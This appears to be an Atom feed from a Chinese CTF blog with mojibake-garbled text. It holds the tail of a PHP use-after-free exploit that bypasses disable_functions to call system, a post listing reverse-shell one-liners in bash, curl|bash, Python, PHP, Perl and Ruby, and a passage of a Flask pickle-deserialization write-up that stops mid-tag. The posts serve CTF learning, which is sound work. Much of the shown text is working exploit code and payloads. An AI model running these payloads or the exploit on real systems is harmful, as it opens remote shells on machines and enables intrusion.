class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = unserialize(<span class="variable">$poc</span>);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢çš„expé€šè¿‡èšå‰‘ä¸Šä¼ </p><p><img src="/2022/01/06/GYCTF2020-EasyThinking/image-20220106233958835.png" alt="image-20220106233958835"></p><p>æœ€ååœ¨searchç•Œé¢ä¼ é€’ä¸€ä¸ªkey=<code>&lt;?php include(&#39;/var/www/html/runtime/session/exp.php&#39;)?&gt;</code>å¹¶è®¿é—®sessionæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; thinkphp-v6.0.0æ¡†æ¶æ¼æ´+disable_functionsç»•è¿‡&lt;/p&gt;
&lt;p&gt;æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç®€æ˜“ç½‘ç«™ï¼Œç›®å½•æ‰«æå‘ç°åœ¨ &lt;code&gt;www.zip&lt;/code&gt; æœ‰æºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/01/06/GYCTF202</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/06/test/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/06/test/</id>
    <published>2022-01-06T06:55:00.000Z</published>
    <updated>2022-01-06T08:08:15.817Z</updated>
    
    <content type="html"><![CDATA[<p>åšå®¢è¿ç§»æµ‹è¯•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åšå®¢è¿ç§»æµ‹è¯•&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>åå¼¹shellç®€å•å…¥é—¨</title>
    <link href="https://wuyusanhua2021.github.io/2022/01/03/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wuyusanhua2021.github.io/2022/01/03/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-01-03T07:10:13.000Z</published>
    <updated>2022-01-06T05:20:09.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h1><p>åå¼¹shell(reverse shell)ï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚reverse shellä¸telnetï¼Œsshç­‰æ ‡å‡†shellå¯¹åº”ï¼Œæœ¬è´¨ä¸Šæ˜¯ç½‘ç»œæ¦‚å¿µçš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è§’è‰²åè½¬ã€‚é€šå¸¸ç”¨äºè¢«æ§ç«¯å› <strong>é˜²ç«å¢™å—é™ã€æƒé™ä¸è¶³ã€ç«¯å£è¢«å ç”¨</strong>ç­‰æƒ…å½¢ã€‚</p><h1 id="å®ç°åŸç†"><a href="#å®ç°åŸç†" class="headerlink" title="å®ç°åŸç†"></a>å®ç°åŸç†</h1><h2 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h2><p>linuxæ–‡ä»¶æè¿°ç¬¦å¯ä»¥ç†è§£ä¸ºlinuxè·Ÿè¸ªæ‰“å¼€æ–‡ä»¶ï¼Œè€Œåˆ†é…çš„ä¸€ä¸ªæ•°å­—ï¼Œè¿™ä¸ªæ•°å­—æœ‰ç‚¹ç±»ä¼¼cè¯­è¨€æ“ä½œæ–‡ä»¶æ—¶å€™çš„å¥æŸ„ï¼Œé€šè¿‡å¥æŸ„å°±å¯ä»¥å®ç°æ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚</p><p>å½“Linuxå¯åŠ¨æ—¶ä¼šé»˜è®¤æ‰“å¼€ä¸‰ç§æ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ul><li>æ ‡å‡†è¾“å…¥ standard input 0ï¼ˆè®¾å¤‡é»˜è®¤é”®ç›˜ï¼‰</li><li>æ ‡å‡†è¾“å‡º standard output 1ï¼ˆè®¾å¤‡é»˜è®¤æ˜¾ç¤ºå™¨ï¼‰</li><li>é”™è¯¯è¾“å‡º error output 2ï¼ˆè®¾å¤‡é»˜è®¤æ˜¾ç¤ºå™¨ï¼‰</li></ul><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><ol><li>è¾“å…¥é‡å®šå‘ <strong>&lt;    &lt;&lt;</strong></li><li>è¾“å‡ºé‡å®šå‘ <strong>&gt;    &gt;&gt;</strong></li></ol><p>bashåœ¨æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¼šå…ˆæŒ‰ç…§ä»å·¦è‡³å³çš„é¡ºåºè§£æé‡å®šå‘ç¬¦ï¼Œç„¶åå†æŠŠé‡å®šå‘ç¬¦å»æ‰æ‰§è¡ŒæŒ‡ä»¤</p><table><thead><tr><th align="left">å‘½ä»¤</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">command &gt; file</td><td align="left">å°†è¾“å‡ºé‡å®šå‘åˆ° fileã€‚</td></tr><tr><td align="left">command &lt; file</td><td align="left">å°†è¾“å…¥é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td align="left">command &gt;&gt; file</td><td align="left">å°†è¾“å‡ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td align="left">n &gt; file</td><td align="left">å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td align="left">n &gt;&gt; file</td><td align="left">å°†æ–‡ä»¶æè¿°ç¬¦ä¸º n çš„æ–‡ä»¶ä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘åˆ° fileã€‚</td></tr><tr><td align="left">n &gt;&amp; m</td><td align="left">å°†è¾“å‡ºæ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td></tr><tr><td align="left">n &lt;&amp; m</td><td align="left">å°†è¾“å…¥æ–‡ä»¶ m å’Œ n åˆå¹¶ã€‚</td></tr><tr><td align="left">&lt;&lt; tag</td><td align="left">å°†å¼€å§‹æ ‡è®° tag å’Œç»“æŸæ ‡è®° tag ä¹‹é—´çš„å†…å®¹ä½œä¸ºè¾“å…¥ã€‚</td></tr></tbody></table><h1 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a>bashåå¼¹shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;1</span><br></pre></td></tr></table></figure><ol><li>bash -iï¼š æ‰“å¼€ä¸€ä¸ªäº¤äº’çš„bash</li><li>&amp;ï¼š å°†æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º</li><li>/dev/tcp/ip/portï¼šè¿™ä¸ªæ–‡ä»¶å®é™…ä¸Šä¸å­˜åœ¨ï¼Œä½†åœ¨<strong>Linuxä¸‹ä¸€åˆ‡çš†æ–‡ä»¶</strong>ï¼Œå¯ä»¥å°†å…¶çœ‹ä½œä¸€ä¸ªè®¾å¤‡ï¼Œå¦‚æœä½ åœ¨ä¸€æ–¹ç›‘å¬ç«¯å£çš„æƒ…å†µä¸‹å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œå°±èƒ½å®ç°ä¸ç›‘å¬ç«¯å£çš„æœåŠ¡å™¨çš„socketé€šä¿¡</li><li>0&gt;&amp;1ï¼šå°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œå› ä¸ºæ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†æ”»å‡»æœºä¸Šï¼Œæ‰€ä»¥æ ‡å‡†è¾“å…¥ä¹Ÿå°±é‡å®šå‘åˆ°äº†æ”»å‡»æœºä¸Š</li></ol><h1 id="curl-bashåå¼¹shell"><a href="#curl-bashåå¼¹shell" class="headerlink" title="curl+bashåå¼¹shell"></a>curl+bashåå¼¹shell</h1><p>é¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ªindexæ–‡ä»¶ï¼ˆindex.phpæˆ–index.htmlï¼‰ï¼Œå†…å®¹ä¸º<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p><p>ç„¶åå¼€å¯ç«¯å£ç›‘å¬ï¼Œå¹¶åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œå‘½ä»¤<code>curl ip|bash</code></p><h1 id="å„ç§è„šæœ¬åå¼¹shell"><a href="#å„ç§è„šæœ¬åå¼¹shell" class="headerlink" title="å„ç§è„šæœ¬åå¼¹shell"></a>å„ç§è„šæœ¬åå¼¹shell</h1><p>Python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>Perl:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><p>Ruby:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line">æˆ–</span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å«ä¹‰&quot;&gt;&lt;a href=&quot;#å«ä¹‰&quot; class=&quot;headerlink&quot; title=&quot;å«ä¹‰&quot;&gt;&lt;/a&gt;å«ä¹‰&lt;/h1&gt;&lt;p&gt;åå¼¹shell(reverse shell)ï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HFCTF2021-easyflask-writeup</title>
    <link href="https://wuyusanhua2021.github.io/2021/12/20/HFCTF2021-easyflask-writeup/"/>
    <id>https://wuyusanhua2021.github.io/2021/12/20/HFCTF2021-easyflask-writeup/</id>
    <published>2021-12-20T05:58:27.000Z</published>
    <updated>2022-01-06T05:20:10.756Z</updated>
    
    <content type="html"><![CDATA[<p>æŒ‰ç…§æç¤ºè·³è½¬åˆ°<code>file?file=/app/source</code>ï¼Œå¾—æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®¡è®¡å¾—åˆ°ä¿¡æ¯ï¼š</p><p>1ï¼‰<code>SECRET_KEY</code>å…·ä½“å€¼æœªçŸ¥</p><p>2ï¼‰file_handler()ä¼šè¿‡æ»¤è®¿é—®è¯·æ±‚ï¼Œè¯·æ±‚åˆæ³•åˆ™è¿”å›æ–‡ä»¶å†…å®¹ï¼Œä¸”è¾“å…¥çš„è·¯å¾„ä¼šè¢«æ‹¼æ¥åˆ°<code>static</code>åé¢ï¼Œæ­¤å¤„æœ‰ä¸€ä¸ªå°çŸ¥è¯†ï¼šå½“ <code>os.path.join()</code>çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºç»å¯¹è·¯å¾„æ—¶æ‹¼æ¥çš„ç»“æœå°±æ˜¯è¯¥ç»å¯¹è·¯å¾„</p><p>3ï¼‰/adminè·¯ç”±ä¸‹ä¼šæå–uï¼Œè‹¥uåœ¨å­—å…¸ä¸­ï¼Œåˆ™æå–uä¸­çš„bå¹¶å¯¹å…¶è¿›è¡Œbase64è§£ç ï¼Œèµ‹å€¼ç»™uï¼Œå†å¯¹uååºåˆ—åŒ–</p><p>å…·ä½“æ€è·¯å°±æ˜¯ä¼ªé€ sessionæ‰§è¡Œpickleååºåˆ—åŒ–RCE</p><p>flaskçš„sessionä¼ªé€ å¿…é¡»è¦å¯†é’¥<code>SECRET_KEY</code>ï¼Œå¯†é’¥ä¸€èˆ¬é€šè¿‡ç¯å¢ƒå˜é‡ä¼ é€’ç»™ç¨‹åºæˆ–è€…å†™åœ¨é…ç½®æ–‡ä»¶é‡Œé¢</p><blockquote><p>é€šå¸¸æƒ…å†µä¸‹è·å– <code>secret_key</code> çš„æ–¹æ³•æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>ç½‘ç«™æŸå¤„æ³„éœ²è·å–</li><li>é€šè¿‡ SSTI æ¼æ´è·å–ï¼Œå¦‚ <code>/&#123;&#123;config&#125;&#125;</code></li><li>é€šè¿‡ SSRF è¯»å–å­˜åœ¨ <code>secret_key</code> çš„ Flask é…ç½®æ–‡ä»¶æˆ–è¯»å– /proc/self/environ è·å–</li><li>çˆ†ç ´</li></ul></blockquote><p>æœ¬é¢˜å¯ä»¥åœ¨ç¯å¢ƒå˜é‡<code>/proc/self/environ</code>ä¸­æ‰¾åˆ°</p><p><img src="/2021/12/20/HFCTF2021-easyflask-writeup/image-20211220142529168.png" 